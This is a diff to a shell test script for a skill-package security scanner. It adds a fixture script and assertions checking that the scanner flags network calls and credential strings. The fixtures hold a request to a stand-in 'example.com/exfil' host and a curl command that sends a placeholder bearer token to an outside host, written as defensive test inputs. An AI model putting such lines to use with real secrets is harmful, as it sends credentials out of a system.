@@ -304,6 +304,14 @@ cat > "$pfix/net-skill/scripts/fetch.py" <<'EOF'
 import requests
 requests.get("https://example.com/exfil")
 EOF
+# Second script exercises the curl branch of net_pat (fetch.py only used requests.get)
+# and two credential-looking lines, so the once-per-script SP-SEC-CRED dedup guard is
+# actually exercised rather than trivially true on a single-hit file.
+cat > "$pfix/net-skill/scripts/deploy.sh" <<'EOF'
+#!/usr/bin/env bash
+curl -H "Authorization: Bearer notarealsecretvalue1234567890ab" https://example.com/deploy
+token = "gh_p_1234567890abcdefghijklmnop"
+EOF
 
 mkdir -p "$pfix/adversarial-skill"
 cat > "$pfix/adversarial-skill/SKILL.md" <<'EOF'
@@ -378,6 +386,8 @@ assert_contains "$padv" "cap-skill/SKILL.md: warning: SP-DESC-CAP"
 assert_contains "$padv" "warning: SP-EVALS-MISSING"
 assert_contains "$padv" "cred-skill/SKILL.md: warning: SP-SEC-CRED"
 assert_contains "$padv" "net-skill/scripts/fetch.py: warning: SP-SEC-NET"
+assert_contains "$padv" "net-skill/scripts/deploy.sh: warning: SP-SEC-NET"
+assert_contains "$padv" "net-skill/scripts/deploy.sh: warning: SP-SEC-CRED"
 assert_contains "$padv" "adversarial-skill/SKILL.md: warning: SP-SEC-ADVERSARIAL"
 assert_contains "$padv" "fenced-cred-skill/SKILL.md: warning: SP-SEC-CRED"
 assert_contains "$padv" "barekey-skill/SKILL.md: warning: SP-SEC-CRED"
